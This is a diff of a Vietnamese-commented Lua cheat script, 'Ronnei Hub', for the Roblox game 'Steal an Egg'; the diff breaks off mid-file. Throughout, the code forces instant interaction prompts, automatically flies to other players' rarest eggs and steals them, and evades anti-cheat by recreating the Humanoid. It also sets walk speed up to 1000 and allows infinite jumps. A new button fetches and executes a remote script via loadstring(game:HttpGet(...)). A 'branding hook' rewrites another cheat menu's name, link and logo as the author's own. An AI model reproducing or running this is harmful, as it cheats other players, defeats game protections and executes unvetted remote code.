@@ -1,15 +1,16 @@
 -- ==============================================================================
---  RONNEI HUB - STEAL AN EGG (OFFICIAL V2.6 - REAL PICKUP & RETURN ENGINE)
---  Khắc phục triệt để:
---    1. Sửa lỗi Delta fireproximityprompt (Ép HoldDuration = 0, đa tầng tương tác).
---    2. Chuẩn hóa WorldPosition của Prompt trong Attachment (tiếp cận chuẩn 100%).
---    3. Xác nhận nhặt thành công mới bay về nộp Base | Slider WalkSpeed 16 - 1000.
+--  RONNEI HUB - STEAL AN EGG (OFFICIAL V2.7 - 3-TAB HYBRID ARCHITECTURE)
+--  Cấu trúc 3 Tab:
+--    Tab 1: 🔰 Menu Gốc (Khởi chạy script gốc, Hook Logo & Chữ Ronnei, Nhặt 0.12s)
+--    Tab 2: 🥚 Cướp Trứng (Auto Steal Rarest Egg, Ghim tọa độ Base, WorldPos)
+--    Tab 3: ⚡ Nhân Vật (Bypass Anti-Cheat BAC-1511, Slider WalkSpeed 16-1000, Inf Jump)
 -- ==============================================================================
 
 local TweenService = game:GetService("TweenService")
 local UserInputService = game:GetService("UserInputService")
 local RunService = game:GetService("RunService")
 local CoreGuiService = game:GetService("CoreGui")
+local ProximityPromptService = game:GetService("ProximityPromptService")
 local Workspace = game:GetService("Workspace")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
@@ -17,8 +18,9 @@ local LocalPlayer = Players.LocalPlayer
 local CONFIG = {
     LogoAssetID       = "rbxassetid://124285855971647",
     TikTokURL         = "https://www.tiktok.com/@ronnei7.htk?_r=1&_t=ZS-98ygZG9Gh2G",
-    TweenSpeed        = 135, -- Tốc độ bay an toàn (studs/s)
-    BaseExclusionDist = 35   -- Khoảng cách an toàn quanh Base (tránh nhặt nhầm trứng nhà)
+    StealHoldDuration = 0.12,
+    TweenSpeed        = 135,
+    BaseExclusionDist = 35
 }
 
 local RARITY_WEIGHTS = {
@@ -58,6 +60,8 @@ local FONT_BOLD = Enum.Font.GothamBold
 local FONT_MED  = Enum.Font.GothamMedium
 
 local STATE = {
+    FastSteal012    = true,
+    BrandingHook    = true,
     AutoStealRarest = false,
     WalkSpeedValue  = 16,
     WalkSpeedLocked = false,
@@ -71,127 +75,152 @@ local ActiveConnections = {
 
 local recordedBasePosition = nil
 
--- ==================== 1. BYPASS ANTI-CHEAT (HUMANOID RECREATE) ====================
-local function bypassAntiCheat()
-    pcall(function()
-        local char = LocalPlayer.Character
-        if not char then return end
-
-        local humanoid = char:FindFirstChildOfClass("Humanoid")
-        if humanoid then
-            local cam = Workspace.CurrentCamera
-            local camPos = cam.CFrame
-            local clone = humanoid:Clone()
-            clone.Parent = char
-            humanoid:Destroy()
-            task.wait(0.1)
-
-            local newHum = char:FindFirstChildOfClass("Humanoid")
-            if newHum then
-                cam.CameraSubject = newHum
-                newHum.WalkSpeed = STATE.WalkSpeedValue
-            end
-            cam.CFrame = camPos
+-- ==================== 1. CORE LOGIC TAB 1: NHẶT NHANH 0.12S & BRANDING HOOK ====================
+task.spawn(function()
+    local function tunePrompt(prompt)
+        if prompt:IsA("ProximityPrompt") and STATE.FastSteal012 then
+            prompt.HoldDuration = CONFIG.StealHoldDuration
+            prompt.RequiresLineOfSight = false
+            pcall(function()
+                prompt.MaxActivationDistance = math.max(prompt.MaxActivationDistance, 25)
+            end)
         end
+    end
+
+    for _, desc in ipairs(Workspace:GetDescendants()) do tunePrompt(desc) end
+    Workspace.DescendantAdded:Connect(tunePrompt)
+
+    ProximityPromptService.PromptButtonHoldBegan:Connect(function(prompt)
+        if STATE.FastSteal012 then
+            pcall(function()
+                prompt.HoldDuration = CONFIG.StealHoldDuration
+                task.delay(CONFIG.StealHoldDuration, function()
+                    if fireproximityprompt then
+                        fireproximityprompt(prompt)
+                    end
+                end)
+            end)
+        end
+    end)
+end)
+
+local function startBrandingHook()
+    local function hijackElement(inst)
+        if not STATE.BrandingHook then return end
+        pcall(function()
+            if inst:IsA("TextLabel") or inst:IsA("TextButton") then
+                local function applyBranding()
+                    if not STATE.BrandingHook then return end
+                    local raw = inst.Text:upper()
+                    if raw:find("EQUINOZ") then
+                        inst.Text = "RONNEI HUB"
+                    elseif raw:find("VEUURTUMWE") or raw:find("DISCORD.GG") then
+                        inst.Text = "TIKTOK: @RONNEI7.HTK"
+                    end
+                end
+                applyBranding()
+                inst:GetPropertyChangedSignal("Text"):Connect(applyBranding)
+
+            elseif inst:IsA("ImageLabel") or inst:IsA("ImageButton") then
+                local p = inst.Parent
+                local pName = p and p.Name:lower() or ""
+                local iName = inst.Name:lower()
+                local ownerSg = inst:FindFirstAncestorOfClass("ScreenGui")
+                local isTarget = false
+
+                if ownerSg and ownerSg.Name ~= "RonneiHub_V2_7_Master" then
+                    for _, sibling in ipairs(ownerSg:GetDescendants()) do
+                        if (sibling:IsA("TextLabel") or sibling:IsA("TextButton")) and sibling.Text:upper():find("ANTI HIT") then
+                            isTarget = true
+                            break
+                        end
+                    end
+                end
+
+                if isTarget and (pName:find("logo") or pName:find("icon") or pName:find("toggle") or pName:find("btn") or iName:find("logo") or iName:find("icon") or inst:IsA("ImageButton")) then
+                    local function applyLogo()
+                        if not STATE.BrandingHook then return end
+                        if inst.Image ~= CONFIG.LogoAssetID then
+                            inst.Image = CONFIG.LogoAssetID
+                        end
+                    end
+                    applyLogo()
+                    inst:GetPropertyChangedSignal("Image"):Connect(applyLogo)
+                end
+            end
+        end)
+    end
+
+    local searchRoots = {
+        CoreGuiService,
+        gethui and gethui(),
+        LocalPlayer and LocalPlayer:FindFirstChild("PlayerGui")
+    }
+
+    for _, root in ipairs(searchRoots) do
+        if root then
+            for _, desc in ipairs(root:GetDescendants()) do hijackElement(desc) end
+            root.DescendantAdded:Connect(hijackElement)
+        end
+    end
+end
+task.spawn(startBrandingHook)
+
+local function loadOriginalScript()
+    task.spawn(function()
+        pcall(function()
+            script_key = "Trial"
+            getgenv().script_key = "Trial"
+            loadstring(game:HttpGet("https://api.getpolsec.com/scripts/hosted/6582551b42d21c6b7eb55f1d76d8d50ce53cb35592093d6615b5e83437594dc0.lua"))()
+        end)
     end)
 end
 
--- ==================== 2. HỆ THỐNG ĐỊNH VỊ CHUẨN XÁC TỪNG PROMPT ====================
+-- ==================== 2. CORE LOGIC TAB 2: AUTO STEAL RAREST EGG ====================
 local function getPromptWorldPosition(prompt)
     if not prompt or not prompt.Parent then return nil end
     local parent = prompt.Parent
-
-    if parent:IsA("Attachment") then
-        return parent.WorldPosition
-    elseif parent:IsA("BasePart") then
-        return parent.Position
-    end
-
+    if parent:IsA("Attachment") then return parent.WorldPosition end
+    if parent:IsA("BasePart") then return parent.Position end
     local bp = parent:FindFirstChildWhichIsA("BasePart", true)
     return bp and bp.Position or nil
 end
 
--- Bộ kích hoạt tương tác nhặt tối ưu hóa hoàn toàn cho Delta
 local function forceTriggerSteal(prompt)
-    if not prompt or not prompt:IsDescendantOf(Workspace) or not prompt.Enabled then
-        return false
-    end
-
+    if not prompt or not prompt:IsDescendantOf(Workspace) or not prompt.Enabled then return false end
     pcall(function()
         prompt.HoldDuration = 0
         prompt.RequiresLineOfSight = false
         prompt.MaxActivationDistance = 45
     end)
-
-    pcall(function()
-        if fireproximityprompt then
-            fireproximityprompt(prompt)
-        end
-    end)
-
+    pcall(function() if fireproximityprompt then fireproximityprompt(prompt) end end)
     pcall(function()
         prompt:InputHoldBegin()
         task.wait(0.04)
         prompt:InputHoldEnd()
     end)
-
-    pcall(function()
-        prompt:Activate()
-    end)
-
-    pcall(function()
-        if firesignal then
-            firesignal(prompt.Triggered, LocalPlayer)
-        end
-    end)
-
+    pcall(function() prompt:Activate() end)
     return true
 end
 
--- Kiểm tra xem đã cướp thành công quả trứng hay chưa
 local function isEggCollected(prompt, targetPart)
     local char = LocalPlayer.Character
-
-    -- 1. Prompt bị game hủy hoặc tắt kích hoạt (đã bị nhặt)
-    if not prompt or not prompt.Parent or not prompt:IsDescendantOf(Workspace) or not prompt.Enabled then
-        return true
-    end
-
-    -- 2. Quả trứng/Part bị phá hủy
-    if not targetPart or not targetPart.Parent or not targetPart:IsDescendantOf(Workspace) then
-        return true
-    end
-
-    -- 3. Nhân vật đang cầm đồ trên tay (Tool hoặc Model trứng)
+    if not prompt or not prompt.Parent or not prompt:IsDescendantOf(Workspace) or not prompt.Enabled then return true end
+    if not targetPart or not targetPart.Parent or not targetPart:IsDescendantOf(Workspace) then return true end
     if char then
-        if char:FindFirstChildWhichIsA("Tool") or LocalPlayer.Backpack:FindFirstChildWhichIsA("Tool") then
-            return true
-        end
-
+        if char:FindFirstChildWhichIsA("Tool") or LocalPlayer.Backpack:FindFirstChildWhichIsA("Tool") then return true end
         for _, item in ipairs(char:GetChildren()) do
             local n = item.Name:lower()
             if (n:find("egg") or n:find("brainrot") or n:find("stolen") or n:find("carry")) and not item:IsA("Humanoid") then
                 return true
             end
         end
-
-        local hrp = char:FindFirstChild("HumanoidRootPart")
-        if hrp then
-            for _, child in ipairs(hrp:GetChildren()) do
-                if child:IsA("JointInstance") and child.Part1 and child.Part1.Parent ~= char then
-                    return true
-                end
-            end
-        end
     end
-
     return false
 end
 
--- ==================== 3. HỆ THỐNG TÌM KIẾM BASE & TRỨNG HIẾM ====================
 local function getMyBasePosition()
     if recordedBasePosition then return recordedBasePosition end
-
     pcall(function()
         local plots = Workspace:FindFirstChild("Plots") or Workspace:FindFirstChild("Bases") or Workspace:FindFirstChild("Tycoons")
         if plots then
@@ -210,31 +239,24 @@ local function getMyBasePosition()
             end
         end
     end)
-
     if not recordedBasePosition then
         local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
         if hrp then recordedBasePosition = hrp.Position end
     end
-
     return recordedBasePosition or Vector3.new(0, 0, 0)
 end
 
 local function scanRarestEnemyEgg(basePos)
-    local bestPrompt = nil
-    local bestPosition = nil
-    local bestPart = nil
+    local bestPrompt, bestPosition, bestPart = nil, nil, nil
     local maxWeight = -1
 
     pcall(function()
         local stealKeywords = {"steal", "grab", "take", "collect", "rob", "cướp", "nhặt", "egg", "brainrot"}
-
         for _, desc in ipairs(Workspace:GetDescendants()) do
             if desc:IsA("ProximityPrompt") and desc.Enabled then
                 local worldPos = getPromptWorldPosition(desc)
                 if worldPos then
                     local distFromBase = (worldPos - basePos).Magnitude
-
-                    -- Chỉ chọn trứng ở sân đối thủ (cách Base tối thiểu 35 studs)
                     if distFromBase > CONFIG.BaseExclusionDist then
                         local parent = desc.Parent
                         local model = parent:FindFirstAncestorOfClass("Model") or parent
@@ -242,27 +264,20 @@ local function scanRarestEnemyEgg(basePos)
 
                         local isSteal = false
                         for _, kw in ipairs(stealKeywords) do
-                            if textData:find(kw, 1, true) then
-                                isSteal = true
-                                break
-                            end
+                            if textData:find(kw, 1, true) then isSteal = true break end
                         end
 
                         if isSteal then
                             local weight = 1
                             local upper = textData:upper()
                             for rName, w in pairs(RARITY_WEIGHTS) do
-                                if upper:find(rName) and w > weight then
-                                    weight = w
-                                end
+                                if upper:find(rName) and w > weight then weight = w end
                             end
 
                             local attrRarity = model:GetAttribute("Rarity") or parent:GetAttribute("Rarity")
                             if attrRarity and typeof(attrRarity) == "string" then
                                 local u = attrRarity:upper()
-                                if RARITY_WEIGHTS[u] and RARITY_WEIGHTS[u] > weight then
-                                    weight = RARITY_WEIGHTS[u]
-                                end
+                                if RARITY_WEIGHTS[u] and RARITY_WEIGHTS[u] > weight then weight = RARITY_WEIGHTS[u] end
                             end
 
                             if weight > maxWeight then
@@ -277,7 +292,6 @@ local function scanRarestEnemyEgg(basePos)
             end
         end
     end)
-
     return bestPrompt, bestPosition, bestPart
 end
 
@@ -305,13 +319,10 @@ local function safeTweenMove(targetPos)
         if conn then conn:Disconnect() end
     end)
 
-    while not finished and STATE.AutoStealRarest do
-        task.wait(0.04)
-    end
+    while not finished and STATE.AutoStealRarest do task.wait(0.04) end
     return finished
 end
 
--- ==================== 4. VÒNG LẶP AUTO STEAL RAREST ====================
 local function startAutoStealProcess()
     task.spawn(function()
         while STATE.AutoStealRarest do
@@ -322,12 +333,9 @@ local function startAutoStealProcess()
 
                 if hrp and basePos then
                     local targetPrompt, targetWorldPos, targetPart = scanRarestEnemyEgg(basePos)
-
                     if targetPrompt and targetWorldPos then
-                        -- Bước 1: Bay áp sát vị trí quả trứng (cách 1.2 studs)
                         safeTweenMove(targetWorldPos + Vector3.new(0, 1.2, 0))
 
-                        -- Bước 2: Khóa nhẹ vận tốc và nhặt liên tục đến khi cầm được trứng
                         local pickStart = tick()
                         while STATE.AutoStealRarest and not isEggCollected(targetPrompt, targetPart) and (tick() - pickStart < 3.5) do
                             if hrp then
@@ -338,11 +346,9 @@ local function startAutoStealProcess()
                             task.wait(0.08)
                         end
 
-                        -- Bước 3: Bay trở về nộp vào Base
                         task.wait(0.1)
                         safeTweenMove(basePos + Vector3.new(0, 2.5, 0))
 
-                        -- Chờ nộp vào khay (tối đa 2.5 giây)
                         local depositStart = tick()
                         while STATE.AutoStealRarest and isEggCollected(nil, nil) and (tick() - depositStart < 2.5) do
                             task.wait(0.2)
@@ -358,10 +364,31 @@ local function startAutoStealProcess()
     end)
 end
 
--- ==================== 5. ĐIỀU CHỈNH TỐC ĐỘ 16 - 1000 & NHẢY ====================
+-- ==================== 3. CORE LOGIC TAB 3: WALKSPEED 1000 & INFINITE JUMP ====================
+local function bypassAntiCheat()
+    pcall(function()
+        local char = LocalPlayer.Character
+        if not char then return end
+        local humanoid = char:FindFirstChildOfClass("Humanoid")
+        if humanoid then
+            local cam = Workspace.CurrentCamera
+            local camPos = cam.CFrame
+            local clone = humanoid:Clone()
+            clone.Parent = char
+            humanoid:Destroy()
+            task.wait(0.1)
+            local newHum = char:FindFirstChildOfClass("Humanoid")
+            if newHum then
+                cam.CameraSubject = newHum
+                newHum.WalkSpeed = STATE.WalkSpeedValue
+            end
+            cam.CFrame = camPos
+        end
+    end)
+end
+
 local function setWalkSpeedEngine(enable)
     STATE.WalkSpeedLocked = enable
-
     if ActiveConnections.WalkSpeed then
         ActiveConnections.WalkSpeed:Disconnect()
         ActiveConnections.WalkSpeed = nil
@@ -388,7 +415,6 @@ end
 
 local function setInfiniteJump(enable)
     STATE.InfiniteJump = enable
-
     if ActiveConnections.InfiniteJump then
         ActiveConnections.InfiniteJump:Disconnect()
         ActiveConnections.InfiniteJump = nil
@@ -398,21 +424,19 @@ local function setInfiniteJump(enable)
         ActiveConnections.InfiniteJump = UserInputService.JumpRequest:Connect(function()
             pcall(function()
                 local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
-                if hum then
-                    hum:ChangeState(Enum.HumanoidStateType.Jumping)
-                end
+                if hum then hum:ChangeState(Enum.HumanoidStateType.Jumping) end
             end)
         end)
     end
 end
 
--- ==================== 6. GIAO DIỆN 2 TAB RONNEI HUB ====================
+-- ==================== 4. GIAO DIỆN 3 TAB (TAB 1 Ở ĐẦU TIÊN) ====================
 local parentTarget = (gethui and gethui()) or CoreGuiService or (LocalPlayer and LocalPlayer:FindFirstChild("PlayerGui"))
-local oldGui = parentTarget:FindFirstChild("RonneiHub_V2_WorkingFinal")
+local oldGui = parentTarget:FindFirstChild("RonneiHub_V2_7_Master")
 if oldGui then pcall(function() oldGui:Destroy() end) end
 
 local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "RonneiHub_V2_WorkingFinal"
+ScreenGui.Name = "RonneiHub_V2_7_Master"
 ScreenGui.ResetOnSpawn = false
 ScreenGui.IgnoreGuiInset = true
 ScreenGui.DisplayOrder = 2147483647
@@ -420,8 +444,8 @@ ScreenGui.Parent = parentTarget
 
 local MainCard = Instance.new("Frame", ScreenGui)
 MainCard.Name = "MainCard"
-MainCard.Size = UDim2.new(0, 315, 0, 375)
-MainCard.Position = UDim2.new(1, -335, 0, 60)
+MainCard.Size = UDim2.new(0, 320, 0, 380)
+MainCard.Position = UDim2.new(1, -340, 0, 55)
 MainCard.BackgroundColor3 = THEME.MainBG
 MainCard.BorderSizePixel = 0
 Instance.new("UICorner", MainCard).CornerRadius = UDim.new(0, 12)
@@ -452,7 +476,7 @@ local Subtitle = Instance.new("TextLabel", Header)
 Subtitle.Size = UDim2.new(1, -50, 0, 14)
 Subtitle.Position = UDim2.new(0, 14, 0, 24)
 Subtitle.BackgroundTransparency = 1
-Subtitle.Text = "STEAL AN EGG • SPECIAL V2.6"
+Subtitle.Text = "STEAL AN EGG • MASTER V2.7"
 Subtitle.Font = FONT_MED
 Subtitle.TextSize = 10
 Subtitle.TextColor3 = THEME.AccentMint
@@ -492,85 +516,93 @@ local function makeDraggable(targetFrame, dragBar)
 end
 makeDraggable(MainCard, Header)
 
+-- Tab Bar (3 Tab)
 local TabBar = Instance.new("Frame", MainCard)
-TabBar.Size = UDim2.new(1, -24, 0, 32)
-TabBar.Position = UDim2.new(0, 12, 0, 46)
+TabBar.Size = UDim2.new(1, -20, 0, 32)
+TabBar.Position = UDim2.new(0, 10, 0, 46)
 TabBar.BackgroundColor3 = THEME.CardBG
 Instance.new("UICorner", TabBar).CornerRadius = UDim.new(0, 8)
 
 local Tab1Btn = Instance.new("TextButton", TabBar)
-Tab1Btn.Size = UDim2.new(0.5, -2, 1, -4)
+Tab1Btn.Size = UDim2.new(0.333, -2, 1, -4)
 Tab1Btn.Position = UDim2.new(0, 2, 0, 2)
 Tab1Btn.BackgroundColor3 = THEME.MainBG
-Tab1Btn.Text = "🥚 Cướp Trứng"
+Tab1Btn.Text = "🔰 Menu Gốc"
 Tab1Btn.Font = FONT_BOLD
-Tab1Btn.TextSize = 11
+Tab1Btn.TextSize = 10
 Tab1Btn.TextColor3 = THEME.AccentMint
 Instance.new("UICorner", Tab1Btn).CornerRadius = UDim.new(0, 6)
 
 local Tab2Btn = Instance.new("TextButton", TabBar)
-Tab2Btn.Size = UDim2.new(0.5, -2, 1, -4)
-Tab2Btn.Position = UDim2.new(0.5, 0, 0, 2)
+Tab2Btn.Size = UDim2.new(0.333, -2, 1, -4)
+Tab2Btn.Position = UDim2.new(0.333, 1, 0, 2)
 Tab2Btn.BackgroundTransparency = 1
-Tab2Btn.Text = "⚡ Nhân Vật"
+Tab2Btn.Text = "🥚 Cướp Trứng"
 Tab2Btn.Font = FONT_BOLD
-Tab2Btn.TextSize = 11
+Tab2Btn.TextSize = 10
 Tab2Btn.TextColor3 = THEME.TextSub
 Instance.new("UICorner", Tab2Btn).CornerRadius = UDim.new(0, 6)
 
+local Tab3Btn = Instance.new("TextButton", TabBar)
+Tab3Btn.Size = UDim2.new(0.333, -2, 1, -4)
+Tab3Btn.Position = UDim2.new(0.666, 0, 0, 2)
+Tab3Btn.BackgroundTransparency = 1
+Tab3Btn.Text = "⚡ Nhân Vật"
+Tab3Btn.Font = FONT_BOLD
+Tab3Btn.TextSize = 10
+Tab3Btn.TextColor3 = THEME.TextSub
+Instance.new("UICorner", Tab3Btn).CornerRadius = UDim.new(0, 6)
+
 local TabContainer = Instance.new("Frame", MainCard)
-TabContainer.Size = UDim2.new(1, -24, 1, -90)
-TabContainer.Position = UDim2.new(0, 12, 0, 84)
+TabContainer.Size = UDim2.new(1, -20, 1, -88)
+TabContainer.Position = UDim2.new(0, 10, 0, 82)
 TabContainer.BackgroundTransparency = 1
 
-local Tab1Frame = Instance.new("ScrollingFrame", TabContainer)
-Tab1Frame.Size = UDim2.new(1, 0, 1, 0)
-Tab1Frame.BackgroundTransparency = 1
-Tab1Frame.BorderSizePixel = 0
-Tab1Frame.ScrollBarThickness = 2
-Tab1Frame.ScrollBarImageColor3 = THEME.AccentMint
-Tab1Frame.AutomaticCanvasSize = Enum.AutomaticSize.Y
-Tab1Frame.CanvasSize = UDim2.new(0, 0, 0, 0)
-local Layout1 = Instance.new("UIListLayout", Tab1Frame)
-Layout1.Padding = UDim.new(0, 8)
+local function createScrollFrame()
+    local sc = Instance.new("ScrollingFrame", TabContainer)
+    sc.Size = UDim2.new(1, 0, 1, 0)
+    sc.BackgroundTransparency = 1
+    sc.BorderSizePixel = 0
+    sc.ScrollBarThickness = 2
+    sc.ScrollBarImageColor3 = THEME.AccentMint
+    sc.AutomaticCanvasSize = Enum.AutomaticSize.Y
+    sc.CanvasSize = UDim2.new(0, 0, 0, 0)
+    local l = Instance.new("UIListLayout", sc)
+    l.Padding = UDim.new(0, 7)
+    return sc
+end
 
-local Tab2Frame = Instance.new("ScrollingFrame", TabContainer)
-Tab2Frame.Size = UDim2.new(1, 0, 1, 0)
-Tab2Frame.BackgroundTransparency = 1
-Tab2Frame.BorderSizePixel = 0
-Tab2Frame.ScrollBarThickness = 2
-Tab2Frame.ScrollBarImageColor3 = THEME.AccentMint
-Tab2Frame.AutomaticCanvasSize = Enum.AutomaticSize.Y
-Tab2Frame.CanvasSize = UDim2.new(0, 0, 0, 0)
+local Tab1Frame = createScrollFrame()
+local Tab2Frame = createScrollFrame()
+local Tab3Frame = createScrollFrame()
 Tab2Frame.Visible = false
-local Layout2 = Instance.new("UIListLayout", Tab2Frame)
-Layout2.Padding = UDim.new(0, 8)
+Tab3Frame.Visible = false
 
-local function switchTab(toTab1)
-    Tab1Frame.Visible = toTab1
-    Tab2Frame.Visible = not toTab1
+local function switchTab(tabIndex)
+    Tab1Frame.Visible = (tabIndex == 1)
+    Tab2Frame.Visible = (tabIndex == 2)
+    Tab3Frame.Visible = (tabIndex == 3)
 
-    if toTab1 then
-        Tab1Btn.BackgroundTransparency = 0
-        Tab1Btn.BackgroundColor3 = THEME.MainBG
-        Tab1Btn.TextColor3 = THEME.AccentMint
-        Tab2Btn.BackgroundTransparency = 1
-        Tab2Btn.TextColor3 = THEME.TextSub
-    else
-        Tab2Btn.BackgroundTransparency = 0
-        Tab2Btn.BackgroundColor3 = THEME.MainBG
-        Tab2Btn.TextColor3 = THEME.AccentMint
-        Tab1Btn.BackgroundTransparency = 1
-        Tab1Btn.TextColor3 = THEME.TextSub
+    local btnList = {Tab1Btn, Tab2Btn, Tab3Btn}
+    for i, btn in ipairs(btnList) do
+        if i == tabIndex then
+            btn.BackgroundTransparency = 0
+            btn.BackgroundColor3 = THEME.MainBG
+            btn.TextColor3 = THEME.AccentMint
+        else
+            btn.BackgroundTransparency = 1
+            btn.TextColor3 = THEME.TextSub
+        end
     end
 end
 
-Tab1Btn.MouseButton1Click:Connect(function() switchTab(true) end)
-Tab2Btn.MouseButton1Click:Connect(function() switchTab(false) end)
+Tab1Btn.MouseButton1Click:Connect(function() switchTab(1) end)
+Tab2Btn.MouseButton1Click:Connect(function() switchTab(2) end)
+Tab3Btn.MouseButton1Click:Connect(function() switchTab(3) end)
 
 local function createToggleRow(parent, titleText, subText, initialState, onToggle)
     local card = Instance.new("Frame", parent)
-    card.Size = UDim2.new(1, -4, 0, 46)
+    card.Size = UDim2.new(1, -4, 0, 44)
     card.BackgroundColor3 = THEME.CardBG
     Instance.new("UICorner", card).CornerRadius = UDim.new(0, 8)
 
@@ -579,7 +611,7 @@ local function createToggleRow(parent, titleText, subText, initialState, onToggl
     stroke.Thickness = 1
 
     local lbl = Instance.new("TextLabel", card)
-    lbl.Size = UDim2.new(1, -65, 0, 20)
+    lbl.Size = UDim2.new(1, -65, 0, 18)
     lbl.Position = UDim2.new(0, 10, 0, 4)
     lbl.BackgroundTransparency = 1
     lbl.Text = titleText
@@ -590,7 +622,7 @@ local function createToggleRow(parent, titleText, subText, initialState, onToggl
 
     local sub = Instance.new("TextLabel", card)
     sub.Size = UDim2.new(1, -65, 0, 16)
-    sub.Position = UDim2.new(0, 10, 0, 24)
+    sub.Position = UDim2.new(0, 10, 0, 22)
     sub.BackgroundTransparency = 1
     sub.Text = subText
     sub.Font = FONT_MED
@@ -599,7 +631,7 @@ local function createToggleRow(parent, titleText, subText, initialState, onToggl
     sub.TextXAlignment = Enum.TextXAlignment.Left
 
     local switch = Instance.new("TextButton", card)
-    switch.Size = UDim2.new(0, 40, 0, 22)
+    switch.Size = UDim2.new(0, 38, 0, 20)
     switch.Position = UDim2.new(1, -10, 0.5, 0)
     switch.AnchorPoint = Vector2.new(1, 0.5)
     switch.BackgroundColor3 = initialState and THEME.AccentMint or THEME.ToggleOff
@@ -608,24 +640,21 @@ local function createToggleRow(parent, titleText, subText, initialState, onToggl
     Instance.new("UICorner", switch).CornerRadius = UDim.new(1, 0)
 
     local knob = Instance.new("Frame", switch)
-    knob.Size = UDim2.new(0, 16, 0, 16)
-    knob.Position = initialState and UDim2.new(1, -18, 0.5, 0) or UDim2.new(0, 3, 0.5, 0)
+    knob.Size = UDim2.new(0, 14, 0, 14)
+    knob.Position = initialState and UDim2.new(1, -17, 0.5, 0) or UDim2.new(0, 3, 0.5, 0)
     knob.AnchorPoint = Vector2.new(0, 0.5)
     knob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
     Instance.new("UICorner", knob).CornerRadius = UDim.new(1, 0)
 
     local state = initialState
-
     local function toggle()
         state = not state
         stroke.Color = state and THEME.AccentMint or THEME.Border
         sub.TextColor3 = state and THEME.AccentMint or THEME.TextSub
         switch.BackgroundColor3 = state and THEME.AccentMint or THEME.ToggleOff
-
         TweenService:Create(knob, TweenInfo.new(0.15), {
-            Position = state and UDim2.new(1, -18, 0.5, 0) or UDim2.new(0, 3, 0.5, 0)
+            Position = state and UDim2.new(1, -17, 0.5, 0) or UDim2.new(0, 3, 0.5, 0)
         }):Play()
-
         onToggle(state)
     end
 
@@ -637,8 +666,64 @@ local function createToggleRow(parent, titleText, subText, initialState, onToggl
     end)
 end
 
--- ==================== TAB 1 ====================
-createToggleRow(Tab1Frame, "Auto Steal Rarest Egg", "Cướp trứng đối thủ, nhặt dính & nộp về Base", STATE.AutoStealRarest, function(val)
+-- ==================== NỘI DUNG TAB 1: MENU GỐC & BRANDING ====================
+local RunHostBtn = Instance.new("TextButton", Tab1Frame)
+RunHostBtn.Size = UDim2.new(1, -4, 0, 36)
+RunHostBtn.BackgroundColor3 = Color3.fromRGB(30, 42, 62)
+RunHostBtn.Text = "🚀  Tải / Khởi Chạy Menu Script Gốc"
+RunHostBtn.Font = FONT_BOLD
+RunHostBtn.TextSize = 11
+RunHostBtn.TextColor3 = THEME.AccentMint
+RunHostBtn.AutoButtonColor = false
+Instance.new("UICorner", RunHostBtn).CornerRadius = UDim.new(0, 8)
+local RunHostStroke = Instance.new("UIStroke", RunHostBtn)
+RunHostStroke.Color = THEME.Border
+RunHostStroke.Thickness = 1
+
+RunHostBtn.MouseButton1Click:Connect(function()
+    loadOriginalScript()
+    RunHostBtn.Text = "✓ Đã Gửi Lệnh Chạy Script Gốc!"
+    RunHostStroke.Color = THEME.AccentMint
+    task.delay(2, function()
+        if RunHostBtn.Parent then
+            RunHostBtn.Text = "🚀  Tải / Khởi Chạy Menu Script Gốc"
+            RunHostStroke.Color = THEME.Border
+        end
+    end)
+end)
+
+createToggleRow(Tab1Frame, "Nhặt Nhanh 0.12 Giây", "Tối ưu tương tác ProximityPrompt mượt mà", STATE.FastSteal012, function(val)
+    STATE.FastSteal012 = val
+end)
+
+createToggleRow(Tab1Frame, "Chèn Logo & Tên Ronnei", "Ghi đè tiêu đề Ronnei Hub & Logo vào menu gốc", STATE.BrandingHook, function(val)
+    STATE.BrandingHook = val
+end)
+
+local TTTab1Btn = Instance.new("TextButton", Tab1Frame)
+TTTab1Btn.Size = UDim2.new(1, -4, 0, 38)
+TTTab1Btn.BackgroundColor3 = THEME.CardBG
+TTTab1Btn.Text = "🔗  TikTok: @ronnei7.htk (Bấm để Copy)"
+TTTab1Btn.Font = FONT_BOLD
+TTTab1Btn.TextSize = 10
+TTTab1Btn.TextColor3 = THEME.AccentMint
+TTTab1Btn.AutoButtonColor = false
+Instance.new("UICorner", TTTab1Btn).CornerRadius = UDim.new(0, 8)
+local TTStroke1 = Instance.new("UIStroke", TTTab1Btn)
+TTStroke1.Color = THEME.Border
+TTStroke1.Thickness = 1
+
+TTTab1Btn.MouseButton1Click:Connect(function()
+    if setclipboard then setclipboard(CONFIG.TikTokURL)
+    elseif toclipboard then toclipboard(CONFIG.TikTokURL) end
+    TTTab1Btn.Text = "[V] Đã sao chép link TikTok!"
+    task.delay(1.5, function()
+        if TTTab1Btn.Parent then TTTab1Btn.Text = "🔗  TikTok: @ronnei7.htk (Bấm để Copy)" end
+    end)
+end)
+
+-- ==================== NỘI DUNG TAB 2: CƯỚP TRỨNG ====================
+createToggleRow(Tab2Frame, "Auto Steal Rarest Egg", "Tự tìm trứng xịn đối thủ, nhặt & mang về nộp", STATE.AutoStealRarest, function(val)
     STATE.AutoStealRarest = val
     if val then
         getMyBasePosition()
@@ -646,8 +731,7 @@ createToggleRow(Tab1Frame, "Auto Steal Rarest Egg", "Cướp trứng đối th�
     end
 end)
 
--- Nút ghim tọa độ Base hiện tại
-local SetBaseBtn = Instance.new("TextButton", Tab1Frame)
+local SetBaseBtn = Instance.new("TextButton", Tab2Frame)
 SetBaseBtn.Size = UDim2.new(1, -4, 0, 36)
 SetBaseBtn.BackgroundColor3 = THEME.CardBG
 SetBaseBtn.Text = "📍  Ghim Vị Trí Base Hiện Tại"
@@ -677,46 +761,8 @@ SetBaseBtn.MouseButton1Click:Connect(function()
     end)
 end)
 
-local TikTokRow = Instance.new("TextButton", Tab1Frame)
-TikTokRow.Size = UDim2.new(1, -4, 0, 42)
-TikTokRow.BackgroundColor3 = THEME.CardBG
-TikTokRow.Text = ""
-TikTokRow.AutoButtonColor = false
-Instance.new("UICorner", TikTokRow).CornerRadius = UDim.new(0, 8)
-
-local TTRowStroke = Instance.new("UIStroke", TikTokRow)
-TTRowStroke.Color = THEME.Border
-TTRowStroke.Thickness = 1
-
-local TTIcon = Instance.new("ImageLabel", TikTokRow)
